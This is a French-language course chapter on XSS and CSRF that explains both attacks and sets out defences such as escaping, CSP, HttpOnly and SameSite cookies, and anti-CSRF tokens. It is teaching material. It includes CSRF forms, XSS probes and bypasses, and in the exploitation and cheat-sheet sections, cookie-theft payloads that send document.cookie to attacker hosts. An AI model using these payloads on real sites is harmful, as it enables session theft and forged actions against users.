---
title: "Chapitre 4 -- XSS et CSRF"
sidebar_position: 4
---

# Chapitre 4 -- XSS et CSRF

> Source : 2026 CSRF XSS.pdf
> Objectif : comprendre les attaques XSS et CSRF, leurs mecanismes, et les protections

---

## 4.1 CSRF -- Cross-Site Request Forgery

### Concept

Le CSRF ("sea-surf") force le navigateur de la victime a executer une action non desiree sur un site ou elle est authentifiee.

```
La victime est connectee (authentifiee) sur le site cible.
L'attaquant lui fait visiter une page malicieuse.
Cette page envoie automatiquement une requete au site cible.
Le navigateur joint automatiquement les cookies d'authentification.
Le site cible execute la requete en pensant qu'elle vient de la victime.
```

### Exemple GET

```html noexec
<!-- Page malicieuse : change la cle WPA du routeur -->
<img src="http://192.168.0.1/WPA.php?key=00DEAD">
```

### Exemple POST

```html noexec
<!-- Formulaire cache qui se soumet automatiquement -->
<form action="https://target.com/change/key" method="POST">
    <input type="hidden" name="key" value="00DEAD" />
</form>
<script>document.forms[0].submit();</script>
```

### Protections

| Protection | Mecanisme |
|-----------|-----------|
| **SameSite=Strict** (meilleure) | Le navigateur n'envoie pas le cookie si la requete vient d'un autre site |
| **Token anti-CSRF** | Valeur aleatoire dans le formulaire, inconnue de l'attaquant |
| **Verifier Referer/Origin** | Complement, pas suffisant seul |

---

## 4.2 XSS -- Cross-Site Scripting

### Concept

Injection de code (generalement JavaScript) dans une page web, execute par le navigateur d'un autre utilisateur.

### Difference avec les autres injections

```
Injection SQL --> injecte dans la BASE DE DONNEES
Injection CMD --> injecte dans le SYSTEME D'EXPLOITATION
XSS           --> injecte dans la SORTIE WEB (HTML/JS)
                  c'est une injection dans le OUTPUT
```

### Types de XSS

| Type | Ou est le code | Qui est touche | Gravite |
|------|---------------|----------------|---------|
| **Reflete** (Reflected) | Dans l'URL/requete | Celui qui clique sur le lien | Moyenne |
| **Stocke** (Stored) | En base de donnees | Tous les visiteurs | Haute |
| **DOM-based** | Cote client | Depend du contexte | Variable |

### Tests de detection

```html noexec
<!-- Phase 1 : le HTML est-il interprete ? -->
<b>aaa</b>
<p style="color:red">test</p>

<!-- Phase 2 : le JS s'execute-t-il ? -->
<script>alert('xss')</script>
<img src="0" onerror=alert(document.cookie)>
<a href="javascript:alert('XSS')">xss</a>
```

### Exploitation : vol de cookie

```html noexec
<img src="0" onerror="window.location='http://attaquant.com/get.php?cookie='+document.cookie;">
```

### Techniques de contournement

```html noexec
<SCRipt>alert(42)</SCRipt>              <!-- casse mixte -->
<img src=1>                             <!-- sans guillemets -->
<SCRIPT SRC=http://evil.com/evil.js></SCRIPT>  <!-- script distant -->
```

---

## 4.3 Protections contre XSS

### Principe fondamental

> **Ne jamais faire confiance a une sortie !** Ne jamais faire confiance aux donnees envoyees au navigateur.

### Echapper les caracteres sensibles

| Caractere | Remplacement |
|-----------|-------------|
| `&` | `&amp;` |
| `<` | `&lt;` |
| `>` | `&gt;` |
| `"` | `&quot;` |
| `'` | `&#x27;` |
| `/` | `&#x2F;` |

### Fonctions du langage

```php noexec
// PHP : htmlspecialchars avec ENT_QUOTES
$pseudo = htmlspecialchars($_POST['name'], ENT_QUOTES);
echo "Hello " . $pseudo . " !";
```

```python noexec
# Python : table d'echappement
html_escape_table = {
    "&": "&amp;", '"': "&quot;", "'": "&apos;",
    ">": "&gt;", "<": "&lt;"
}
def html_escape(text):
    return "".join(html_escape_table.get(c, c) for c in text)
```

### Content Security Policy (CSP)

```
Content-Security-Policy: script-src 'self' https://trusted-cdn.com;
```
Controle quelles ressources le navigateur peut charger. Desactive les scripts inline sauf avec un nonce valide.

### Cookie HttpOnly

```
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```
Empeche JavaScript d'acceder au cookie via `document.cookie`.

### Hierarchie des protections XSS

```
1. CSP stricte (disable inline, nonce-based)
2. Echapper systematiquement TOUTES les sorties
3. HttpOnly + Secure + SameSite sur les cookies
4. Tainting / marquage des variables
5. Validation des entrees (complement)
```

---

## 4.4 Comparaison XSS vs CSRF

| Aspect | XSS | CSRF |
|--------|-----|------|
| **Cible** | Le navigateur de la victime | Le serveur via le navigateur |
| **Mecanisme** | Injection de code dans la page | Forge une requete authentifiee |
| **Code execute** | Oui (JavaScript) | Non (juste une requete HTTP) |
| **Principe** | "Ne jamais faire confiance a une sortie" | "Verifier l'origine de la requete" |
| **Protection** | Echapper sorties + CSP | Token anti-CSRF + SameSite |

---

## 4.5 Identifier les attaques dans les logs (DS)

```
Voir <script>, alert(, <img onerror         --> XSS
Voir UNION, SELECT, OR 1=1, '--             --> SQL
Voir ;, |, ||, &&, `cmd`, $(cmd)            --> CMD
Voir URL d'action sans token/nonce          --> CSRF
Rien de malicieux, exploration normale      --> INFO
```

---

## CHEAT SHEET -- XSS et CSRF

```
XSS :
  Reflete  = dans l'URL, 1 victime (clic)
  Stocke   = en BDD, tous les visiteurs (plus grave)
  DOM      = cote client, pas de serveur

  Vol cookie : <img src=0 onerror="window.location='http://evil/c='+document.cookie">
  Protection : htmlspecialchars($val, ENT_QUOTES) + CSP + HttpOnly

CSRF :
  GET  : <img src="http://target/action?param=X">
  POST : formulaire cache + auto-submit
  Protection : SameSite=Strict + token anti-CSRF

  Phrase : "Ne jamais faire confiance a une sortie !" (XSS)

PIEGES DS :
  - XSS = injection de code / CSRF = forge de requete
  - ENT_QUOTES obligatoire dans htmlspecialchars
  - HttpOnly ne protege pas contre toute XSS (redirection, keylogger...)
  - CSP est la meilleure protection moderne contre XSS
```
